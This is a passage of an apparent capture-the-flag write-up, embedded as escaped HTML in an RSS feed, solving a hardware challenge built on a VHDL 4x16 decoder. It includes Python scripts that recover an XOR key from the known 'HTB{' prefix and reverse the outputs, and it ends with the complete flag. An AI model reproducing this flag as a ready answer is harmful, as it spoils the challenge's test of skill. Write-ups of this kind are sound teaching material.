+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">output_1 ^ decoder_4x16(&amp;#34;H&amp;#34;) = 1st byte of key.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">output_2 ^ decoder_4x16(&amp;#34;T&amp;#34;) = 2nd byte of key.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">output_3 ^ decoder_4x16(&amp;#34;B&amp;#34;) = 3rd byte of key.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">output_4 ^ decoder_4x16(&amp;#34;{&amp;#34;) = 4th byte of key.
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Here is the code to generate the key:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">decoder_4x16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">val&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">val&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="ow">or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">15&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">get_key&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inputs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outputs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">307&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">17&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">53&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">183&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">2103&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">c&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;HTB{&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inputs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0xf0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="mi">4&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">inputs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">ord&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&lt;/span> &lt;span class="mh">0x0f&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputs&lt;/span>&lt;span class="p">)):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="n">decoder_4x16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">inputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="n">outputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">k&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;0x&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">k&lt;/span>&lt;span class="si">:&lt;/span>&lt;span class="s2">02X&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">get_key&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>It will output the values:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">0x33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x33
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x31
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x37
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x37
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>From this we know the key to be &lt;code>0x33313137&lt;/code>.
+Now the rest of the challenge is just to reverse the outputs so we can figure out the inputs.
+Here is the code to solve the challenge:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-Python" data-lang="Python">&lt;span class="line">&lt;span class="cl">&lt;span class="ch">#!/usr/bin/python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">encoder_4x16&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">dict&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">n&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">val&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">n&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">val&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">val&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">cases&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">signal&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">reverse_process&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[&lt;/span> &lt;span class="mh">0x33&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x31&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x31&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x37&lt;/span> &lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">None&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outputs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">[]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;out.txt&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">lines&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">f&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">readlines&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">line&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">lines&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">outputs&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">append&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="nb">int&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">line&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">i&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nb">len&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">outputs&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">d1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encoder_4x16&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="n">outputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">d2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">encoder_4x16&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="n">outputs&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span>&lt;span class="p">][&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">^&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">i&lt;/span> &lt;span class="o">%&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">c&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">d1&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="mi">4&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">d2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">flag&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">reverse_process&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>The flag is: &lt;code>HTB{I_L0v3_VHDL_but_LOve_my_5w33thear7_m0re}&lt;/code>.&lt;/p></description></item></channel></rss>
